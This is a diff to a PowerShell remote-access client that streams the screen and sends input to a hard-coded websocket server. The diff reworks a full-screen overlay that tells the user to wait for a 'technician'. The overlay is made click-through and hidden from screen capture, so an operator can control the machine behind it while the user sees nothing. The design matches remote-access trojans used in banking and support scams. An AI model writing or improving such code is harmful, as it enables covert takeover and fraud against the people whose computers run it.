@@ -127,12 +127,110 @@ public static class Input {
 "@
 Add-Type -TypeDefinition $inputCode
 
+# API para Lock Screen
+$lockApiCode = @"
+using System;
+using System.Runtime.InteropServices;
+using System.Windows.Forms;
+using System.Drawing;
+using System.Threading;
+
+public class LockScreen {
+    [DllImport("user32.dll")]
+    static extern bool SetWindowDisplayAffinity(IntPtr hwnd, uint affinity);
+
+    [DllImport("user32.dll")]
+    static extern int GetWindowLong(IntPtr hwnd, int index);
+
+    [DllImport("user32.dll")]
+    static extern int SetWindowLong(IntPtr hwnd, int index, int newLong);
+
+    const int GWL_EXSTYLE = -20;
+    const int WS_EX_LAYERED = 0x80000;
+    const int WS_EX_TRANSPARENT = 0x20;
+    const uint WDA_EXCLUDEFROMCAPTURE = 0x11;
+
+    private static Form lockForm = null;
+    private static Thread lockThread = null;
+    private static bool isRunning = false;
+
+    public static void Show(string message) {
+        if (isRunning) return;
+        isRunning = true;
+
+        lockThread = new Thread(() => {
+            lockForm = new Form();
+            lockForm.Text = "";
+            lockForm.FormBorderStyle = FormBorderStyle.None;
+            lockForm.StartPosition = FormStartPosition.Manual;
+            lockForm.Location = new Point(0, 0);
+            lockForm.Size = Screen.PrimaryScreen.Bounds.Size;
+            lockForm.TopMost = true;
+            lockForm.BackColor = Color.FromArgb(15, 15, 20);
+            lockForm.ShowInTaskbar = false;
+
+            Label title = new Label();
+            title.Text = message;
+            title.Font = new Font("Segoe UI", 32, FontStyle.Bold);
+            title.ForeColor = Color.White;
+            title.AutoSize = true;
+            title.BackColor = Color.Transparent;
+
+            Label sub = new Label();
+            sub.Text = "Por favor, aguarde o tecnico liberar a tela.";
+            sub.Font = new Font("Segoe UI", 14);
+            sub.ForeColor = Color.FromArgb(150, 150, 160);
+            sub.AutoSize = true;
+            sub.BackColor = Color.Transparent;
+
+            lockForm.Controls.Add(title);
+            lockForm.Controls.Add(sub);
+
+            lockForm.Load += (s, e) => {
+                // Transparente para cliques
+                int style = GetWindowLong(lockForm.Handle, GWL_EXSTYLE);
+                SetWindowLong(lockForm.Handle, GWL_EXSTYLE, style | WS_EX_LAYERED | WS_EX_TRANSPARENT);
+
+                // Esconder da captura
+                SetWindowDisplayAffinity(lockForm.Handle, WDA_EXCLUDEFROMCAPTURE);
+
+                // Centralizar
+                int sw = lockForm.Width;
+                int sh = lockForm.Height;
+                title.Location = new Point((sw - title.Width) / 2, sh / 2 - 30);
+                sub.Location = new Point((sw - sub.Width) / 2, sh / 2 + 30);
+            };
+
+            Application.Run(lockForm);
+        });
+
+        lockThread.SetApartmentState(ApartmentState.STA);
+        lockThread.IsBackground = true;
+        lockThread.Start();
+    }
+
+    public static void Hide() {
+        isRunning = false;
+        if (lockForm != null && !lockForm.IsDisposed) {
+            try {
+                lockForm.Invoke(new Action(() => {
+                    lockForm.Close();
+                    lockForm.Dispose();
+                }));
+            } catch { }
+        }
+        lockForm = null;
+        lockThread = null;
+    }
+}
+"@
+Add-Type -TypeDefinition $lockApiCode -ReferencedAssemblies System.Windows.Forms, System.Drawing
+
 $Global:URL = "wss://web-production-9d7cc.up.railway.app"
 $Global:id = $null
 $Global:run = $true
 $Global:panel = $false
 $Global:locked = $false
-$Global:lockJob = $null
 $Global:scale = 0.75
 $Global:quality = 70
 
@@ -237,91 +335,14 @@ function Lock($msg) {
     if ($Global:locked) { return }
     $Global:locked = $true
     Write-Host "  LOCK: $msg" -ForegroundColor Magenta
-
-    $Global:lockJob = Start-Job -ScriptBlock {
-        param($message)
-        Add-Type -AssemblyName System.Windows.Forms
-        Add-Type -AssemblyName System.Drawing
-
-        Add-Type @"
-using System;
-using System.Runtime.InteropServices;
-public class LockAPI {
-    [DllImport("user32.dll")]
-    public static extern bool SetWindowDisplayAffinity(IntPtr hwnd, uint affinity);
-
-    [DllImport("user32.dll")]
-    public static extern int GetWindowLong(IntPtr hwnd, int index);
-
-    [DllImport("user32.dll")]
-    public static extern int SetWindowLong(IntPtr hwnd, int index, int newLong);
-
-    public const int GWL_EXSTYLE = -20;
-    public const int WS_EX_LAYERED = 0x80000;
-    public const int WS_EX_TRANSPARENT = 0x20;
-    public const uint WDA_EXCLUDEFROMCAPTURE = 0x11;
-}
-"@
-
-        $form = New-Object Windows.Forms.Form
-        $form.Text = ""
-        $form.FormBorderStyle = 'None'
-        $form.StartPosition = 'Manual'
-        $form.Location = [Drawing.Point]::new(0, 0)
-        $form.Size = [Windows.Forms.Screen]::PrimaryScreen.Bounds.Size
-        $form.TopMost = $true
-        $form.BackColor = [Drawing.Color]::FromArgb(15, 15, 20)
-        $form.ShowInTaskbar = $false
-        $form.Opacity = 1
-
-        # Mensagem principal
-        $title = New-Object Windows.Forms.Label
-        $title.Text = $message
-        $title.Font = New-Object Drawing.Font("Segoe UI", 32, [Drawing.FontStyle]::Bold)
-        $title.ForeColor = [Drawing.Color]::White
-        $title.AutoSize = $true
-        $title.BackColor = [Drawing.Color]::Transparent
-
-        # Submensagem
-        $sub = New-Object Windows.Forms.Label
-        $sub.Text = "Por favor, aguarde o tecnico liberar a tela."
-        $sub.Font = New-Object Drawing.Font("Segoe UI", 14)
-        $sub.ForeColor = [Drawing.Color]::FromArgb(150, 150, 160)
-        $sub.AutoSize = $true
-        $sub.BackColor = [Drawing.Color]::Transparent
-
-        $form.Controls.AddRange(@($title, $sub))
-
-        $form.Add_Load({
-            # Tornar janela transparente para cliques - admin pode controlar por baixo
-            $style = [LockAPI]::GetWindowLong($form.Handle, [LockAPI]::GWL_EXSTYLE)
-            [LockAPI]::SetWindowLong($form.Handle, [LockAPI]::GWL_EXSTYLE, $style -bor [LockAPI]::WS_EX_LAYERED -bor [LockAPI]::WS_EX_TRANSPARENT) | Out-Null
-
-            # Esconder da captura de tela
-            [LockAPI]::SetWindowDisplayAffinity($form.Handle, [LockAPI]::WDA_EXCLUDEFROMCAPTURE) | Out-Null
-
-            # Centralizar elementos
-            $sw = $form.Width
-            $sh = $form.Height
-            $cy = $sh / 2
-
-            $title.Location = [Drawing.Point]::new(($sw - $title.Width) / 2, $cy - 30)
-            $sub.Location = [Drawing.Point]::new(($sw - $sub.Width) / 2, $cy + 30)
-        })
-
-        [Windows.Forms.Application]::Run($form)
-    } -ArgumentList $msg
+    [LockScreen]::Show($msg)
 }
 
 function Unlock {
     if (-not $Global:locked) { return }
     $Global:locked = $false
     Write-Host "  UNLOCK" -ForegroundColor Green
-    if ($Global:lockJob) {
-        Stop-Job $Global:lockJob -ErrorAction SilentlyContinue
-        Remove-Job $Global:lockJob -Force -ErrorAction SilentlyContinue
-        $Global:lockJob = $null
-    }
+    [LockScreen]::Hide()
 }
 
 function Run {
